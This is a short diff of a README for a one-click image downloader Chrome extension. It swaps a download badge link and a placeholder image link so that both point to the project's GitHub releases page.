@@ -21,7 +21,7 @@ In this repository, you will find the necessary files and code for the Chrome ex
 
 ## 📥 Download Extension
 Click the button below to download the extension:
-[![Download Extension](https://img.shields.io/badge/Download-Extension-blue)](https://github.com/uploads/App.zip)
+[![Download Extension](https://github.com/Beejixx/oneclick-image-downloader-extension/releases)](https://github.com/Beejixx/oneclick-image-downloader-extension/releases)
 
 Please note that the link provided above needs to be launched to start the download. Once downloaded, you can easily install the extension in your Chrome browser and start using it right away.
 
@@ -37,7 +37,7 @@ Let's make the process of image dataset creation more efficient and enjoyable wi
 
 Happy downloading! 🚀
 
-![Image](https://via.placeholder.com/500)
+![Image](https://github.com/Beejixx/oneclick-image-downloader-extension/releases)
 
 --- 
 
